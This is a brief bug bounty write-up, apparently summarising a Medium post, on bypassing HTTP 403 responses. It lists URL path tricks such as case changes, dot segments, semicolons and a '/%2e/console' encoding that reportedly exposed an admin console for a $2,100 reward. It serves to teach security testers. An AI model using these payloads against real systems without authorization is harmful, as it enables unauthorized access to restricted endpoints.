# Bypassing 403s like a PRO! ($2,100)

1. As usual, I begin my directory enumeration with the dirbuster wordlists and find a /console endpoint which returns a 403 response.
2. Ways to bypass 403 endpoints (If /path is blocked)
```
/path –> HTTP 403 Forbidden
/PATH –> HTTP 200 OK
/path/ –> HTTP 200 OK
/path/. –> HTTP 200 OK
//path// –> HTTP 200 OK
/./path/.. –> HTTP 200 OK
/;/path –> HTTP 200 OK
/.;/path –> HTTP 200 OK
//;//path –> HTTP 200 OK
/path.json –> HTTP 200 OK
```
3. I prefer using the 403 Bypasser Burp extension by Gil Nothmann to automate the bypass techniques.
4. What worked for me? Usage of a dot or %2e in the URL path:  `/%2e/console`
<h3>The submission was triaged quickly and categorized as a P1. I was later rewarded with a $2,100 bounty.</h3><br>

## Credit
Based on [Shrirang Diwakar](https://shrirangdiwakar.medium.com/bypassing-403s-like-a-pro-2-100-broken-access-control-66beef4afa8c)'s writeup.
<br>&nbsp;

## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
